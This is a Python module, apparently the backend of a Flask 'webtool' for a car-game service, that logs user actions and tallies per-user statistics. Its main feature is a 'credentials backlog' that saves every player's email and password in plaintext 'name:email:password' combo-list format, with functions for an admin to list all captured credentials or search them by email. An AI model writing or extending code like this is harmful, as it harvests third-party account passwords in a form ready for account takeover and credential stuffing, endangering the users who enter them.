#!/usr/bin/env python3
"""
Backlog module for the TNNR CPM1 Webtool.

Stores user-entered credentials in ``player_name:email:password`` format
and keeps track of every action performed on the site — including
per-user action counts, success/failure tallies, and timestamps.

All data is persisted to JSON files so it survives restarts and can be
inspected independently of the running app.

Files written:
  credentials_backlog.json  – list of credential entries
  action_log.json           – list of every action event
  tracker.json              – per-user aggregate statistics (kept for
                              backwards-compatibility with the original
                              empty tracker.json shipped in the repo)
"""

import json
import os
import threading
import time
from typing import Any, Dict, List, Optional


# ---------------------------------------------------------------------------
# Paths – resolved relative to this file so the module works regardless of
# the current working directory of the Flask process.
# ---------------------------------------------------------------------------
_DIR = os.path.dirname(os.path.abspath(__file__))
CREDENTIALS_FILE = os.path.join(_DIR, "credentials_backlog.json")
ACTION_LOG_FILE = os.path.join(_DIR, "action_log.json")
TRACKER_FILE = os.path.join(_DIR, "tracker.json")

_LOCK = threading.Lock()
_TRACKER_CACHE = None


# ---------------------------------------------------------------------------
# Low-level JSON helpers
# ---------------------------------------------------------------------------
def _load_json(path: str, default: Any) -> Any:
    """Load a JSON file, returning *default* when missing or corrupt."""
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (FileNotFoundError, json.JSONDecodeError):
        return default


def _save_json(path: str, data: Any) -> None:
    """Atomically write *data* to *path* (write-then-rename)."""
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)
    os.replace(tmp, path)


def _load_action_events() -> List[Dict[str, Any]]:
    """Read legacy JSON-array logs and the optimized append-only JSONL format."""
    try:
        with open(ACTION_LOG_FILE, "r", encoding="utf-8") as fh:
            raw = fh.read()
    except FileNotFoundError:
        return []
    if not raw.strip():
        return []
    try:
        parsed = json.loads(raw)
        if isinstance(parsed, list):
            return parsed
    except json.JSONDecodeError:
        pass
    events = []
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            item = json.loads(line)
            if isinstance(item, dict):
                events.append(item)
        except json.JSONDecodeError:
            continue
    return events


def _ensure_action_log_jsonl() -> None:
    """One-time migration from the legacy JSON array to append-only JSONL."""
    try:
        with open(ACTION_LOG_FILE, "r", encoding="utf-8") as fh:
            raw = fh.read()
    except FileNotFoundError:
        return
    stripped = raw.lstrip()
    if not stripped.startswith("["):
        return
    try:
        events = json.loads(raw)
    except json.JSONDecodeError:
        return
    if not isinstance(events, list):
        return
    tmp = ACTION_LOG_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as fh:
        for event in events:
            fh.write(json.dumps(event, ensure_ascii=False, separators=(",", ":")) + "\n")
    os.replace(tmp, ACTION_LOG_FILE)


def _append_action_event(event: Dict[str, Any]) -> None:
    _ensure_action_log_jsonl()
    with open(ACTION_LOG_FILE, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(event, ensure_ascii=False, separators=(",", ":")) + "\n")
        fh.flush()


def _get_tracker_cached() -> Dict[str, Any]:
    global _TRACKER_CACHE
    if _TRACKER_CACHE is None:
        _TRACKER_CACHE = _load_json(TRACKER_FILE, {})
    return _TRACKER_CACHE


# ---------------------------------------------------------------------------
# Credentials backlog
# ---------------------------------------------------------------------------
def record_credentials(player_name: str, email: str, password: str,
                        web_uid: Optional[int] = None) -> Dict[str, Any]:
    """Append a credential entry to the backlog.

    The canonical format is ``player_name:email:password`` but the full
    structured record is also stored so the admin view can render it nicely.

    Returns the entry that was stored.
    """
    entry = {
        "player_name": player_name or "Unknown",
        "email": email or "",
        "password": password or "",
        "credential_string": f"{player_name or 'Unknown'}:{email or ''}:{password or ''}",
        "web_uid": web_uid,
        "recorded_at": time.time(),
        "recorded_at_iso": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
    }
    with _LOCK:
        data = _load_json(CREDENTIALS_FILE, [])
        data.append(entry)
        _save_json(CREDENTIALS_FILE, data)
    return entry


def get_all_credentials() -> List[Dict[str, Any]]:
    """Return every credential entry, newest last."""
    with _LOCK:
        return _load_json(CREDENTIALS_FILE, [])


def find_credentials_by_email(email: str) -> List[Dict[str, Any]]:
    """Return all credential entries matching *email* (case-insensitive)."""
    needle = (email or "").lower()
    with _LOCK:
        return [
            e for e in _load_json(CREDENTIALS_FILE, [])
            if e.get("email", "").lower() == needle
        ]


# ---------------------------------------------------------------------------
# Action log
# ---------------------------------------------------------------------------
def log_action(email: str, action: str, action_title: str,
               success: bool, message: str = "",
               web_uid: Optional[int] = None,
               player_name: Optional[str] = None,
               extra: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Record a single action event and update aggregate stats.

    Returns the event that was stored.
    """
    event = {
        "email": email or "unknown",
        "player_name": player_name or "Unknown",
        "action": action,
        "action_title": action_title,
        "success": bool(success),
        "message": message or "",
        "web_uid": web_uid,
        "timestamp": time.time(),
        "timestamp_iso": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
    }
    if extra:
        event["extra"] = extra

    with _LOCK:
        # 1. Append one line instead of loading + rewriting the entire history.
        _append_action_event(event)

        # 2. Update the per-user aggregate tracker from the in-process cache.
        tracker = _get_tracker_cached()
        key = email or "unknown"
        user = tracker.setdefault(key, {
            "email": key,
            "player_name": player_name or "Unknown",
            "total_actions": 0,
            "successful_actions": 0,
            "failed_actions": 0,
            "actions_by_type": {},
            "first_seen": event["timestamp"],
            "last_action": event["timestamp"],
            "last_action_iso": event["timestamp_iso"],
        })

        # Keep the most recent player name we've seen for this email.
        if player_name and player_name != "Unknown":
            user["player_name"] = player_name

        user["total_actions"] += 1
        if success:
            user["successful_actions"] += 1
        else:
            user["failed_actions"] += 1
        user["actions_by_type"][action] = user["actions_by_type"].get(action, 0) + 1
        user["last_action"] = event["timestamp"]
        user["last_action_iso"] = event["timestamp_iso"]

        _save_json(TRACKER_FILE, tracker)

    return event


def get_all_actions(limit: Optional[int] = None,
                    email_filter: Optional[str] = None) -> List[Dict[str, Any]]:
    """Return action events, newest first.

    *limit* caps the number returned.  *email_filter* restricts to one user.
    """
    with _LOCK:
        events = _load_action_events()
    if email_filter:
        needle = email_filter.lower()
        events = [e for e in events if e.get("email", "").lower() == needle]
    events = list(reversed(events))  # newest first
    if limit:
        events = events[:limit]
    return events


# ---------------------------------------------------------------------------
# Aggregate tracker helpers
# ---------------------------------------------------------------------------
def get_tracker() -> Dict[str, Any]:
    """Return the full per-user aggregate tracker."""
    with _LOCK:
        return dict(_get_tracker_cached())




def log_admin_action(action: str, action_title: str, success: bool,
                     message: str = "", extra: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Log an administrative event without creating/updating a member."""
    event = {
        "email": "admin",
        "player_name": "Admin",
        "action": action,
        "action_title": action_title,
        "success": bool(success),
        "message": message or "",
        "web_uid": None,
        "timestamp": time.time(),
        "timestamp_iso": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
    }
    if extra:
        event["extra"] = extra
    with _LOCK:
        _append_action_event(event)
    return event


def add_balance_to_all_existing_users(amount: int) -> Dict[str, Any]:
    """Add *amount* to every member currently present in the tracker.

    This is a point-in-time bulk grant: users added after this call are not
    affected. Missing balances are treated as zero. Returns a summary.
    """
    if isinstance(amount, bool) or not isinstance(amount, int):
        raise ValueError("Balance amount must be a whole number")
    if amount <= 0:
        raise ValueError("Balance amount must be greater than zero")

    with _LOCK:
        tracker = _get_tracker_cached()
        updated = 0
        total_added = 0
        for user in tracker.values():
            current = user.get("balance", 0)
            try:
                current = int(current)
            except (TypeError, ValueError):
                current = 0
            user["balance"] = current + amount
            updated += 1
            total_added += amount
        _save_json(TRACKER_FILE, tracker)

    return {
        "updated_users": updated,
        "amount_each": amount,
        "total_added": total_added,
    }

def get_user_stats(email: str) -> Optional[Dict[str, Any]]:
    """Return aggregate stats for a single user."""
    with _LOCK:
        return _get_tracker_cached().get(email)


def get_global_stats() -> Dict[str, Any]:
    """Return high-level totals across all users."""
    with _LOCK:
        tracker = _get_tracker_cached()
        creds = _load_json(CREDENTIALS_FILE, [])
        actions = _load_action_events()
    total_actions = sum(u.get("total_actions", 0) for u in tracker.values())
    total_success = sum(u.get("successful_actions", 0) for u in tracker.values())
    total_failed = sum(u.get("failed_actions", 0) for u in tracker.values())
    # Action type breakdown across every user.
    action_types: Dict[str, int] = {}
    for u in tracker.values():
        for act, cnt in u.get("actions_by_type", {}).items():
            action_types[act] = action_types.get(act, 0) + cnt
    # Most active users (top 10).
    ranking = sorted(tracker.values(), key=lambda u: u.get("total_actions", 0), reverse=True)[:10]
    return {
        "total_users": len(tracker),
        "total_credentials": len(creds),
        "total_actions": total_actions,
        "total_successful": total_success,
        "total_failed": total_failed,
        "action_types": action_types,
        "top_users": ranking,
    }
